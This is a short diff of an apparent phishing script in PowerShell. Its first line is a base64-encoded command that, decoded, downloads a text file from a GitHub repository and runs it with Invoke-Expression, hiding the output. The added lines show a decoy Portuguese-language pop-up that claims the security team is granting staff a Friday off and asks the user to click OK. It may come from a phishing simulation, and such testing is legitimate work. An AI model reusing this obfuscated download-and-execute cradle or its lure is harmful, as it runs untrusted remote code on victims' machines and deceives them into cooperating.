@@ -1,1 +1,4 @@
 powershell.exe -e CgAKACQAdQByAGwAIAA9ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAcwBrAHcAdwAvAEEAdABsAGEAcwAvAHIAYQB3AC8AbQBhAGkAbgAvAHMAdQBwAHAAbwByAHQALgB0AHgAdAAiADsACgAkAEMAbwBuAHQAZQBuAHQAIAA9ACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJAB1AHIAbAApAC4AQwBvAG4AdABlAG4AdAA7AAoASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACgAJABDAG8AbgB0AGUAbgB0ACkAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAKAA==
+
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::show('Devido ao grande trabalho da equipe de SEC, estamos ofertando uma folga para toda equipe nexta sexta-feira (09/05/2024), caso esteja de acordo clique em OK.' , 'Atenção',0,32)
